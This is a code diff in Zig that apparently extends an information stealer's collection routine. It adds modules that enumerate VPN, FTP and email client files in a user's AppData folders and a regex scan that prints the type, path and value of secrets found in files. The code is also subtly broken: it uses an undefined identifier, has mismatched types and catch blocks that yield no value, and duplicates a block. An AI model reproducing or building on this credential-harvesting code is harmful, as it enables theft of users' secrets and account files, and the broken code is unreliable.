@@ -10,6 +10,9 @@ const applications = @import("applications.zig");
 const clipboard = @import("clipboard.zig");
 const launch_info = @import("launch_info.zig");
 const regex_grabber = @import("regex_grabber.zig");
+const vpn = @import("../vpn/vpn.zig");
+const ftp = @import("../ftp/ftp.zig");
+const email = @import("../email/email.zig");
 
 pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     var report = std.ArrayList(u8).init(allocator);
@@ -129,6 +132,102 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     }
 
     try w.print("=== Regex Grabber Results ===\n", .{});
+    {
+        const rg = regex_grabber.scanFiles(grabber.DEFAULT_RULES, allocator) catch |e| blk: {
+            break :blk try std.fmt.allocPrint(allocator, "Failed to scan for secrets: {}\n", .{e});
+        };
+        defer allocator.free(rg);
+        if (rg.len > 0) {
+            for (rg) |s| {
+                try w.print("[{s}] {s}: {s}\n", .{ s.secret_type, s.file_path, s.value });
+            }
+        } else {
+            try w.print("No secrets found\n", .{});
+        }
+    }
+
+    try w.print("=== VPN Clients ===\n", .{});
+    {
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
+        defer if (local.len > 0) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
+        defer if (roaming.len > 0) allocator.free(roaming);
+
+        const entries = vpn.collect(allocator, local, roaming) catch {
+            try w.print("  None found\n\n", .{});
+        };
+        defer {
+            for (entries) |*e| {
+                allocator.free(e.name);
+                for (e.files) |f| allocator.free(f);
+                allocator.free(e.files);
+            }
+            allocator.free(entries);
+        }
+        if (entries.len > 0) {
+            for (entries) |e| {
+                try w.print("  {s}: {d} files\n", .{ e.name, e.files.len });
+            }
+        } else {
+            try w.print("  None found\n", .{});
+        }
+    }
+    try w.print("\n", .{});
+
+    try w.print("=== FTP Clients ===\n", .{});
+    {
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
+        defer if (local.len > 0) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
+        defer if (roaming.len > 0) allocator.free(roaming);
+
+        const entries = ftp.collect(allocator, local, roaming) catch {
+            try w.print("  None found\n\n", .{});
+        };
+        defer {
+            for (entries) |*e| {
+                allocator.free(e.name);
+                for (e.files) |f| allocator.free(f);
+                allocator.free(e.files);
+            }
+            allocator.free(entries);
+        }
+        if (entries.len > 0) {
+            for (entries) |e| {
+                try w.print("  {s}: {d} files\n", .{ e.name, e.files.len });
+            }
+        } else {
+            try w.print("  None found\n", .{});
+        }
+    }
+    try w.print("\n", .{});
+
+    try w.print("=== Email Clients ===\n", .{});
+    {
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
+        defer if (local.len > 0) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
+        defer if (roaming.len > 0) allocator.free(roaming);
+
+        const entries = email.collect(allocator, local, roaming) catch {
+            try w.print("  None found\n\n", .{});
+        };
+        defer {
+            for (entries) |*e| {
+                allocator.free(e.name);
+                for (e.files) |f| allocator.free(f);
+                allocator.free(e.files);
+            }
+            allocator.free(entries);
+        }
+        if (entries.len > 0) {
+            for (entries) |e| {
+                try w.print("  {s}: {d} files\n", .{ e.name, e.files.len });
+            }
+        } else {
+            try w.print("  None found\n", .{});
+        }
+    }
     {
         const rg = regex_grabber.scanFiles(grabber.DEFAULT_RULES, allocator) catch |e| blk: {
             break :blk try std.fmt.allocPrint(allocator, "Failed to scan for secrets: {}\n", .{e});
